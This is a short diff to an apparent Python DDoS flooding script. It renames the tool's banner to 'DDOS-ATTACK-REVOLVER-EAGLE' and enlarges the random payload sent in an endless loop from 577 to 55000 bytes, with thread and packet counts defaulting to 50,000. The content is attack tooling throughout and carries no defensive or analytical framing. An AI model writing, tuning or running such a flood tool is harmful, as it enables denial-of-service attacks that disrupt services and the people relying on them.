@@ -51,8 +51,9 @@ ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one 
 ap.add_argument("-th", "--threads", type=int, default=50000, help="Threads")
 args = vars(ap.parse_args())
 
-print("DDOS-ATTACK-TCP-UDP")
-print("#-- TCP/UDP FLOOD --#")
+print("===========================")
+print("DDOS-ATTACK-REVOLVER-EAGLE")
+print("===========================")
 ip = args['ip']
 port = args['port']
 choice = args['choice']
@@ -60,7 +61,7 @@ times = args['times']
 threads = args['threads']
 
 def run():
-	data = random._urandom(577)
+	data = random._urandom(55000)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
